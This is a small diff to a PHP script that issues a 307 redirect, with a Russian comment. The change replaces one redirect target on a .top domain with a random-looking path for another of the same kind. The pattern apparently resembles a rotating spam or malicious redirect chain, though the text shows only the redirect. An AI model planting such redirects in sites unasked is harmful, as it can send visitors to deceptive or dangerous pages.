@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://serverserivo.top/F3tbQZ');
+header('Location: https://serversolentor.top/RyTwtM');
 exit();
 ?>
